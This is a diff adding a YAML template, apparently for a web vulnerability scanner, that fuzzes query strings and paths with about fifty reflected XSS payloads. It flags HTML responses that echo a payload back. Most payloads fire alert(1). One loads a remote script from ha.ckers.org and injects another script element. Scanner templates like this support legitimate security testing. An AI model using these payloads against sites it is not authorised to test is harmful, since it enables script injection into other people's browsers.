@@ -1,0 +1,96 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<input id=x tabindex=1 ondeactivate=alert(1)></input><input id=y tabindex=2></input><input id=z tabindex=3></input><input onactivate=alert(document.getElementById(\"x\").deactive)>"
+        - "<style>:target {color:red;}</style><details id=x style=\"transition:transform 1s\" ontransitionrun=alert(1)></details>"
+        - "<select id=x tabindex=1 onbeforeactivate=alert(1)></select>"
+        - "<frame src=\"javas\\x00cript:alert(1)\"></frame><iframe src=\"http://ha.ckers.org/xss.js\"><script type=\"text/javascript\">var s = window.top.document.createElement(\"script\");s.src=\"http://127.0.0.2/script\";window.top.document.documentElement.appendChild(s);</script></iframe>"
+        - "<form id=x tabindex=1 onbeforeactivate=alert(1)></form><input id=y autofocus>"
+        - "<h1 style=\"x:\\xE2\\x80\\xA8expression(javascript:alert(1)\">test</h1><input autofocus>"
+        - "<font id=x tabindex=1 ondeactivate=alert(1)></font><input id=y autofocus>"
+        - "<html><head id=x tabindex=1 onblur=alert(1)></head></html>\\x0B"
+        - "<sup oncopy=\"alert(1)\" contenteditable>test</sup>"
+        - "<style>@keyframes x{}</style><div style=\"animation-name:x\" onanimationend=\"alert(1)\"></div>"
+        - "<frame onmouseover=\"alert(1)\">test</frame>"
+        - "<picture id=x tabindex=1 onbeforeactivate=alert(1)></picture><input autofocus>"
+        - "<dl draggable=\"true\" ondragleave=\"alert(1)\">test</dl>"
+        - "<video id=\"xss1\" onmouseout=\"alert(1)\">test</video>"
+        - "<canvas id=x tabindex=1></canvas><input id=y autofocus=1></input><script>document.activeElement=alert(1)()</script>"
+        - "<picture oncopy=\"alert(1)\" contenteditable>test</picture><output id=x>test</output><input type=textarea contenteditable onpaste=\"alert(1)\" contenteditable>test</input>"
+        - "<style>:target {transform: rotate(180deg);}</style><img id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)>"
+        - "<form id=x tabindex=1 onbeforeactivate=alert(1)></form>"
+        - "<script>javascript:alert(1)</script>"
+        - "<del onmousedown=\"alert(1)\">test</del>"
+        - "<frameset id=x tabindex=1></frameset><script onfocusout=alert(1)></script>"
+        - "<style>:target {transform: rotate(180deg);}</style><button id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></button>"
+        - "<script type=\"text/javascript\">alert(1)</script>"
+        - "<address onkeypress=\"alert(1)\" contenteditable>test</address>"
+        - "<frame src=\"javascript:javascript:alert(1)\" onload=alert(1)></frame><script>document.write('<img src=x onerror=\"javascript:javascript:alert(1)\">');<input autofocus>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><pre id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></pre>"
+        - "<xmp draggable=\"true\" ondragleave=\"alert(1)\">test</xmp>"
+        - "<h1 id=x tabindex=1 onbeforeactivate=alert(1)></h1>"
+        - "<style>:target {transform: rotate(180deg);}</style><template id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></template>"
+        - "<style>:target {transform: rotate(180deg);}</style><h1 id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)>"
+        - "<style>@keyframes x{}</style><nav style=\"animation-name:x\" id=x></nav><script>x.style.animationDuration = \"1\"</script>"
+        - "&lt;div oncopy=\"alert(1)\"&gt;test&lt;/div&gt;"
+        - "<script id=x tabindex=1 onbeforedeactivate=alert(1)></script><input type=text id=y autofocus>"
+        - "<font src=x:x onerror=\"javascript:alert(1)\">test</font>"
+        - "<acronym onbeforepaste=\"alert(1)\" contenteditable>test</acronym>"
+        - "<form oncopy=\"alert(1)\" contenteditable>test</form>"
+        - "<script>:target {transform: rotate(180deg);}</script><link id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></link><link id=y style=\"transform:rotate(360deg)\" ontransitioncancel=alert(1)></link>"
+        - "<polygon oncopy=\"alert(1)\" contenteditable>test</polygon>"
+        - "<script src=\"http://www.google.com/\"></script>"
+        - "<iframe src=\"javascript:alert(1)\" onload=alert(1)></iframe>"
+        - "<script>\\xE2\\x80\\x88&\\xE2\\x80\\x8Bjavascript:alert(1)\\xE2\\x80\\x89</script><img src=x onerror=javascript:alert(/XSS/)>"
+        - "<div style=\"x:\\xE2\\x80\\x86expression(javascript:alert(1)\">test</div>"
+        - "<style>:target {transform: rotate(180deg);}</style><frame id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></frame>"
+        - "<form id=x tabindex=1 onbeforeactivate=alert(1)></form><input autofocus>"
+        - "<div id=\"payloadbox\" onkeypress=\"alert(1)\">test</div><input type=hidden id=x tabindex=1> <script id=y onkeyup=alert(1)></script><br>"
+        - "<font id=x tabindex=1 ondeactivate=alert(1)></font><input type=text autofocus>"
+        - "<plaintext oncopy=\"alert(1)\" contenteditable>test</plaintext>"
+        - "<style>:target {transform: rotate(180deg);}</style><img id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)>"
+        - "<form id=x tabindex=1 onfocusout=alert(1)></form><input autofocus>"
+        - "<tr draggable=\"true\" ondragleave=\"alert(1)\">test</tr>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
